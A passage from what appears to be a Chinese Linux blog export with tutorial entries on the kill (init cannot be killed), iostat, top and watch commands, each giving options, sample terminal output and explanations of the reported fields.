实例6：init进程是不可杀的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill -9 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17563 17534 0 17:37 pts/1 00:00:00 grep init[root@localhost ~]# kill -9 1[root@localhost ~]# kill -HUP 1[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17565 17534 0 17:38 pts/1 00:00:00 grep init[root@localhost ~]# kill -KILL 1[root@localhost ~]# ps -ef|grep initroot 1 0 0 Nov02 ? 00:00:00 init [3] root 17567 17534 0 17:38 pts/1 00:00:00 grep init[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init是Linux系统操作中不可缺少的程序之一。所谓的init进程，它是一个由内核启动的用户级进程。内核自行启动（已经被载入内存，开始运行，并已初始化所有的设备驱动程序和数据结构等）之后，就通过启动一个用户级程序init的方式，完成引导进程。所以,init始终是第一个进程（其进程编号始终为1）。 其它所有进程都是init进程的子孙。init进程是不可杀的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- iostat]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F49.%20Linux%20%E5%91%BD%E4%BB%A4-%20iostat%2F</url>
    <content type="text"><![CDATA[Linux 命令- iostat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的 iostat是I/O statistics（输入/输出统计）的缩写，iostat工具将对系统的磁盘操作活动进行监视。它的特点是汇报磁盘活动统计情况，同时也会汇报出CPU使用情况。同vmstat一样，iostat也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。iostat属于sysstat软件包。可以用yum install sysstat 直接安装。 1．命令格式1iostat [参数] [时间] [次数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过iostat方便查看CPU、网卡、tty设备、磁盘、CD-ROM 等等设备的活动情况, 负载信息。 3．命令参数 -c 显示CPU使用情况 -d 显示磁盘使用情况 -k 以 KB 为单位显示 -m 以 M 为单位显示 -N 显示磁盘阵列(LVM) 信息 -n 显示NFS 使用情况 -p[磁盘] 显示磁盘和分区的情况 -t 显示终端和CPU的信息 -x 显示详细信息 -V 显示版本信息 4．使用实例实例1：显示所有设备负载情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@CT1186 ~]# iostatLinux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.42 674035705 7517941952sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270023368sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677123536sda6 2.20 0.18 31.22 2837260 481488056sda7 12.48 39.04 326.45 602094508 5035104240 说明：cpu属性值说明： %user：CPU处在用户模式下的时间百分比。 %nice：CPU处在带NICE值的用户模式下的时间百分比。 %system：CPU处在系统模式下的时间百分比。 %iowait：CPU等待输入输出完成时间的百分比。 %steal：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比。 %idle：CPU空闲时间百分比。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：如果%iowait的值过高，表示硬盘存在I/O瓶颈，%idle值高，表示CPU较空闲，如果%idle值高但系统响应慢时，有可能是CPU等待分配内存，此时应加大内存容量。%idle值如果持续低于10，那么系统的CPU处理能力相对较低，表明系统中最需要解决的资源是CPU。 disk属性值说明： rrqm/s: 每秒进行 merge 的读操作数目。即 rmerge/s wrqm/s: 每秒进行 merge 的写操作数目。即 wmerge/s r/s: 每秒完成的读 I/O 设备次数。即 rio/s w/s: 每秒完成的写 I/O 设备次数。即 wio/s rsec/s: 每秒读扇区数。即 rsect/s wsec/s: 每秒写扇区数。即 wsect/s rkB/s: 每秒读K字节数。是 rsect/s 的一半，因为每扇区大小为512字节。 wkB/s: 每秒写K字节数。是 wsect/s 的一半。 avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。 avgqu-sz: 平均I/O队列长度。 await: 平均每次设备I/O操作的等待时间 (毫秒)。 svctm: 平均每次设备I/O操作的服务时间 (毫秒)。 %util: 一秒中有百分之多少的时间用于 I/O 操作，即被io消耗的cpu百分比 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明I/O 队列太长，io响应太慢，则需要进行必要优化。如果avgqu-sz比较大，也表示有当量io在等待。 实例2：定时显示所有信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738394041[root@CT1186 ~]# iostat 2 3Linux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.42 674035705 7517947296sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270023608sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677125640sda6 2.20 0.18 31.22 2837260 481488152sda7 12.48 39.04 326.44 602094508 5035107144avg-cpu: %user %nice %system %iowait %steal %idle 8.88 0.00 7.94 0.19 0.00 83.00Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 6.00 0.00 124.00 0 248sda1 0.00 0.00 0.00 0 0sda2 0.00 0.00 0.00 0 0sda3 0.00 0.00 0.00 0 0sda4 0.00 0.00 0.00 0 0sda5 0.00 0.00 0.00 0 0sda6 0.00 0.00 0.00 0 0sda7 6.00 0.00 124.00 0 248avg-cpu: %user %nice %system %iowait %steal %idle 9.12 0.00 7.81 0.00 0.00 83.07Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 4.00 0.00 84.00 0 168sda1 0.00 0.00 0.00 0 0sda2 0.00 0.00 0.00 0 0sda3 0.00 0.00 0.00 0 0sda4 0.00 0.00 0.00 0 0sda5 0.00 0.00 0.00 0 0sda6 4.00 0.00 84.00 0 168sda7 0.00 0.00 0.00 0 0 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每隔 2秒刷新显示，且显示3次 实例3：显示指定磁盘信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@CT1186 ~]# iostat -d sda1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda1 0.00 0.00 0.00 2658 536 实例4：显示tty和Cpu信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@CT1186 ~]# iostat -tLinux 2.6.18-128.el5 (CT1186) 2012年12月28日Time: 14时58分35秒avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.41 674035705 7517957864sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270024344sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677128808sda6 2.20 0.18 31.22 2837260 481488712sda7 12.48 39.04 326.44 602094508 5035113248 实例5：以M为单位显示所有信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@CT1186 ~]# iostat -mLinux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps MB_read/s MB_wrtn/s MB_read MB_wrtnsda 22.72 0.02 0.24 329119 3670881sda1 0.00 0.00 0.00 1 0sda2 0.11 0.00 0.00 28184 26465sda3 0.98 0.00 0.01 4616 131848sda4 0.00 0.00 0.00 0 0sda5 6.95 0.00 0.05 939 818911sda6 2.20 0.00 0.02 1385 235102sda7 12.48 0.02 0.16 293991 2458553 实例6：查看TPS和吞吐量信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d -k 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1186 ~]# iostat -d -k 1 1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 22.72 21.85 243.71 337017916 3758984340sda1 0.00 0.00 0.00 1329 268sda2 0.11 1.87 1.76 28860797 27101108sda3 0.98 0.31 8.75 4727086 135012508sda4 0.00 0.00 0.00 3 0sda5 6.95 0.06 54.37 962481 838566148sda6 2.20 0.09 15.61 1418630 240744712sda7 12.48 19.52 163.22 301047254 2517559596 说明： tps：该设备每秒的传输次数（Indicate the number of transfers per second that were issued to the device.）。“一次传输”意思是“一次I/O请求”。多个逻辑请求可能会被合并为“一次I/O请求”。“一次传输”请求的大小是未知的。 kB_read/s：每秒从设备（drive expressed）读取的数据量； kB_wrtn/s：每秒向设备（drive expressed）写入的数据量； kB_read：读取的总数据量；kB_wrtn：写入的总数量数据量； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些单位都为Kilobytes。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的例子中，我们可以看到磁盘sda以及它的各个分区的统计数据，当时统计的磁盘总TPS是22.73，下面是各个分区的TPS。（因为是瞬间值，所以总TPS并不严格等于各个分区TPS的总和） 实例7：查看设备使用率（%util）、响应时间（await）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d -x -k 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1186 ~]# iostat -d -x -k 1 1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %utilsda 0.44 38.59 0.40 22.32 21.85 243.71 23.37 0.04 1.78 4.20 9.54sda1 0.00 0.00 0.00 0.00 0.00 0.00 18.90 0.00 8.26 6.46 0.00sda2 0.36 0.43 0.11 0.01 1.87 1.76 63.57 0.01 63.75 1.94 0.02sda3 0.00 1.24 0.04 0.95 0.31 8.75 18.42 0.04 39.77 8.73 0.86sda4 0.00 0.00 0.00 0.00 0.00 0.00 2.00 0.00 19.67 19.67 0.00sda5 0.00 6.65 0.00 6.94 0.06 54.37 15.67 0.26 36.81 4.48 3.11sda6 0.00 1.71 0.01 2.19 0.09 15.61 14.29 0.03 12.40 5.84 1.28sda7 0.08 28.56 0.25 12.24 19.52 163.22 29.28 0.27 21.46 5.00 6.25 说明： rrqm/s： 每秒进行 merge 的读操作数目.即 delta(rmerge)/s wrqm/s： 每秒进行 merge 的写操作数目.即 delta(wmerge)/s r/s： 每秒完成的读 I/O 设备次数.即 delta(rio)/s w/s： 每秒完成的写 I/O 设备次数.即 delta(wio)/s rsec/s： 每秒读扇区数.即 delta(rsect)/s wsec/s： 每秒写扇区数.即 delta(wsect)/s rkB/s： 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节.(需要计算) wkB/s： 每秒写K字节数.是 wsect/s 的一半.(需要计算) avgrq-sz：平均每次设备I/O操作的数据大小 (扇区).delta(rsect+wsect)/delta(rio+wio) avgqu-sz：平均I/O队列长度.即 delta(aveq)/s/1000 (因为aveq的单位为毫秒). await： 平均每次设备I/O操作的等待时间 (毫秒).即 delta(ruse+wuse)/delta(rio+wio) svctm： 平均每次设备I/O操作的服务时间 (毫秒).即 delta(use)/delta(rio+wio) %util： 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的，即 delta(use)/s/1000 (因为use的单位为毫秒) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;idle小于70% IO压力就较大了，一般读取速度有较多的wait。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时可以结合vmstat 查看查看b参数(等待资源的进程数)和wa参数(IO等待所占用的CPU时间的百分比，高过30%时IO压力高)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外 await 的参数也要多和 svctm 来参考。差的过高就一定有 IO 的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;avgqu-sz 也是个做 IO 调优时需要注意的地方，这个就是直接每次操作的数据的大小，如果次数多，但数据拿的小的话，其实 IO 也会很小。如果数据拿的大，才IO 的数据会高。也可以通过 avgqu-sz × ( r/s or w/s ) = rsec/s or wsec/s。也就是讲，读定速度是这个来决定的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;svctm 一般要小于 await (因为同时等待的请求的等待时间被重复计算了)，svctm 的大小一般和磁盘性能有关，CPU/内存的负荷也会对其有影响，请求过多也会间接导致 svctm 的增加。await 的大小一般取决于服务时间(svctm) 以及 I/O 队列的长度和 I/O 请求的发出模式。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明 I/O 队列太长，应用得到的响应时间变慢，如果响应时间超过了用户可以容许的范围，这时可以考虑更换更快的磁盘，调整内核 elevator 算法，优化应用，或者升级 CPU。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;队列长度(avgqu-sz)也可作为衡量系统 I/O 负荷的指标，但由于 avgqu-sz 是按照单位时间的平均值，所以不能反映瞬间的 I/O 洪水。 形象的比喻： r/s+w/s 类似于交款人的总数 平均队列长度(avgqu-sz)类似于单位时间里平均排队人的个数 平均服务时间(svctm)类似于收银员的收款速度 平均等待时间(await)类似于平均每人的等待时间 平均I/O数据(avgrq-sz)类似于平均每人所买的东西多少 I/O 操作率 (%util)类似于收款台前有人排队的时间比例 设备IO操作:总IO(io)/s = r/s(读) +w/s(写) =1.46 + 25.28=26.74 平均每次设备I/O操作只需要0.36毫秒完成,现在却需要10.57毫秒完成，因为发出的 请求太多(每秒26.74个)，假如请求时同时发出的，可以这样计算平均等待时间: 平均等待时间=单个I/O服务器时间*(1+2+…+请求总数-1)/请求总数 每秒发出的I/0请求很多,但是平均队列就4,表示这些请求比较均匀,大部分处理还是比较及时。 实例8：查看cpu状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -c 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@CT1186 ~]# iostat -c 1 3Linux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44avg-cpu: %user %nice %system %iowait %steal %idle 8.64 0.00 5.38 0.00 0.00 85.98avg-cpu: %user %nice %system %iowait %steal %idle 7.62 0.00 5.12 0.50 0.00 86.75]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- top]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F46.%20Linux%20%E5%91%BD%E4%BB%A4-%20top%2F</url>
    <content type="text"><![CDATA[Linux 命令- top&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。下面详细介绍它的使用方法。top是一个动态显示过程,即可以通过用户按键来不断刷新当前状态.如果在前台执行该命令,它将独占前台,直到用户终止该程序为止.比较准确的说,top命令提供了实时的对系统处理器的状态监视.它将显示系统中CPU最“敏感”的任务列表.该命令可以按CPU使用.内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定. 1．命令格式1top [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等 3．命令参数 -b 批处理 -c 显示完整的治命令 -I 忽略失效过程 -s 保密模式 -S 累积模式 -i&lt;时间&gt; 设置间隔时间 -u&lt;用户名&gt; 指定用户名 -p&lt;进程号&gt; 指定进程 -n&lt;次数&gt; 循环显示的次数 4．使用实例实例1：显示进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940[root@TG1704 log]# toptop - 14:06:23 up 70 days, 16:44, 2 users, load average: 1.25, 1.32, 1.35Tasks: 206 total, 1 running, 205 sleeping, 0 stopped, 0 zombieCpu(s): 5.9%us, 3.4%sy, 0.0%ni, 90.4%id, 0.0%wa, 0.0%hi, 0.2%si, 0.0%stMem: 32949016k total, 14411180k used, 18537836k free, 169884k buffersSwap: 32764556k total, 0k used, 32764556k free, 3612636k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 28894 root 22 0 1501m 405m 10m S 52.2 1.3 2534:16 java 18249 root 18 0 3201m 1.9g 11m S 35.9 6.0 569:39.41 java 2808 root 25 0 3333m 1.0g 11m S 24.3 3.1 526:51.85 java 25668 root 23 0 3180m 704m 11m S 14.0 2.2 360:44.53 java 574 root 25 0 3168m 611m 10m S 12.6 1.9 556:59.63 java 1599 root 20 0 3237m 1.9g 11m S 12.3 6.2 262:01.14 java 1008 root 21 0 3147m 842m 10m S 0.3 2.6 4:31.08 java 13823 root 23 0 3031m 2.1g 10m S 0.3 6.8 176:57.34 java 28218 root 15 0 12760 1168 808 R 0.3 0.0 0:01.43 top 29062 root 20 0 1241m 227m 10m S 0.3 0.7 2:07.32 java 1 root 15 0 10368 684 572 S 0.0 0.0 1:30.85 init 2 root RT -5 0 0 0 S 0.0 0.0 0:01.01 migration/0 3 root 34 19 0 0 0 S 0.0 0.0 0:00.00 ksoftirqd/0 4 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/0 5 root RT -5 0 0 0 S 0.0 0.0 0:00.80 migration/1 6 root 34 19 0 0 0 S 0.0 0.0 0:00.00 ksoftirqd/1 7 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/1 8 root RT -5 0 0 0 S 0.0 0.0 0:20.59 migration/2 9 root 34 19 0 0 0 S 0.0 0.0 0:00.09 ksoftirqd/2 10 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/2 11 root RT -5 0 0 0 S 0.0 0.0 0:23.66 migration/3 12 root 34 19 0 0 0 S 0.0 0.0 0:00.03 ksoftirqd/3 13 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/3 14 root RT -5 0 0 0 S 0.0 0.0 0:20.29 migration/4 15 root 34 19 0 0 0 S 0.0 0.0 0:00.07 ksoftirqd/4 16 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/4 17 root RT -5 0 0 0 S 0.0 0.0 0:23.07 migration/5 18 root 34 19 0 0 0 S 0.0 0.0 0:00.07 ksoftirqd/5 19 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/5 20 root RT -5 0 0 0 S 0.0 0.0 0:17.16 migration/6 21 root 34 19 0 0 0 S 0.0 0.0 0:00.05 ksoftirqd/6 22 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/6 23 root RT -5 0 0 0 S 0.0 0.0 0:58.28 migration/7 说明：统计信息区：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前五行是当前系统情况整体的统计信息区。下面我们看每一行信息的具体意义。 第一行，任务队列信息，同 uptime 命令的执行结果，具体参数说明情况如下： 14:06:23 — 当前系统时间 up 70 days, 16:44 — 系统已经运行了70天16小时44分钟（在这期间系统没有重启过的吆！） 2 users — 当前有2个用户登录系统 load average: 1.15, 1.42, 1.44 — load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。 load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。 第二行，Tasks — 任务（进程），具体信息说明如下： 系统现在共有206个进程，其中处于运行中的有1个，205个在休眠（sleep），stoped状态的有0个，zombie状态（僵尸）的有0个。 第三行，cpu状态信息，具体属性说明如下： 5.9%us — 用户空间占用CPU的百分比。 3.4% sy — 内核空间占用CPU的百分比。 0.0% ni — 改变过优先级的进程占用CPU的百分比 90.4% id — 空闲CPU百分比 0.0% wa — IO等待占用CPU的百分比 0.0% hi — 硬中断（Hardware IRQ）占用CPU的百分比 0.2% si — 软中断（Software Interrupts）占用CPU的百分比 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识！ 第四行,内存状态，具体信息如下： 32949016k total — 物理内存总量（32GB） 14411180k used — 使用中的内存总量（14GB） 18537836k free — 空闲内存总量（18GB） 169884k buffers — 缓存的内存量 （169M） 第五行，swap交换分区信息，具体信息说明如下： 32764556k total — 交换区总量（32GB） 0k used — 使用的交换区总量（0K） 32764556k free — 空闲交换区总量（32GB） 3612636k cached — 缓冲的交换区总量（3.6GB） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四行中使用中的内存总量（used）指的是现在系统内核控制的内存数，空闲内存总量（free）是内核还未纳入其管控范围的数量。纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出于习惯去计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached，按这个公式此台服务器的可用内存：18537836k +169884k +3612636k = 22GB左右。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。 第六行，空行。第七行以下：各进程（任务）的状态监控，项目列信息说明如下： PID — 进程id USER — 进程所有者 PR — 进程优先级 NI — nice值。负值表示高优先级，正值表示低优先级 VIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES RES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA SHR — 共享内存大小，单位kb S — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程 %CPU — 上次更新到现在的CPU时间占用百分比 %MEM — 进程使用的物理内存百分比 TIME+ — 进程使用的CPU时间总计，单位1/100秒 COMMAND — 进程名称（命令名/命令行） 其他使用技巧：1.多U多核CPU监控&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;观察上图，服务器有16个逻辑CPU，实际上是4个物理CPU。再按数字键1，就会返回到top基本视图界面。 2.高亮显示当前运行进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;敲击键盘“b”（打开/关闭加亮效果），top的视图变化如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现进程id为2570的“top”进程被加亮了，top进程就是视图第二行显示的唯一的运行态（runing）的那个进程，可以通过敲击“y”键关闭或打开运行态进程的加亮效果。 3.进程字段排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认进入top时，各进程是按照CPU的占用量来排序的，在下图中进程ID为28894的java进程排在第一（cpu占用142%），进程ID为574的java进程排在第二（cpu占用16%）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;敲击键盘“x”（打开/关闭排序列的加亮效果），top的视图变化如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，top默认的排序列是“%CPU”。 4. 通过”shift + &gt;”或”shift + &lt;”可以向右或左改变排序列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下图是按一次”shift + &gt;”的效果图,视图现在已经按照%MEM来排序。 实例2：显示 完整命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例3：显示指定的进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top -p 574 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 5.top交互命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在top 命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了s 选项， 其中一些命令可能会被屏蔽。 h 显示帮助画面，给出一些简短的命令总结说明 k 终止一个进程。 i 忽略闲置和僵死进程。这是一个开关式命令。 q 退出程序 r 重新安排一个进程的优先级别 S 切换到累计模式 s 改变两次刷新之间的延迟时间（单位为s），如果有小数，就换算成m s。输入0值则系统将不断刷新，默认值是5 s f或者F 从当前显示中添加或者删除项目 o或者O 改变显示项目的顺序 l 切换显示平均负载和启动时间信息 m 切换显示内存信息 t 切换显示进程和CPU状态信息 c 切换显示命令名称和完整命令行 M 根据驻留内存大小进行排序 P 根据CPU使用百分比大小进行排序 T 根据时间/累计时间进行排序 W 将当前设置写入~/.toprc文件中]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- watch]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F50.%20Linux%20%E5%91%BD%E4%BB%A4-%20watch%2F</url>
    <content type="text"><![CDATA[Linux 命令- watch&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。在Linux下，watch是周期性的执行下个程序，并全屏显示执行结果。你可以拿他来监测你想要的一切命令的结果变化，比如 tail 一个 log 文件，ls 监测某个文件的大小变化，看你的想象力了！ 1．命令格式1watch [参数] [命令] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令 3．命令参数 -n或–interval watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。 -d或–differences 用-d或–differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。 -t 或-no-title 会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。 -h, –help 查看帮助文档 4．使用实例实例1：每隔一秒高亮显示网络链接数的变化情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 1 -d netstat -ant 说明：其它操作：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换终端： Ctrl+x &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出watch：Ctrl+g 实例2：每隔一秒高亮显示http链接数的变化情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 1 -d 'pstree|grep http' 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加’’将命令区域归整。 实例3：实时查看模拟攻击客户机建立起来的连接数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch 'netstat -an | grep:21 | \ grep&lt;模拟攻击客户机的IP&gt;| wc -l' 实例4：监测当前目录中 scf’ 的文件的变化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -d 'ls -l|grep scf' 实例5：10秒一次输出系统的平均负载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 10 'cat /proc/loadavg']]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ps]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F43.%20Linux%20%E5%91%BD%E4%BB%A4-%20ps%2F</url>
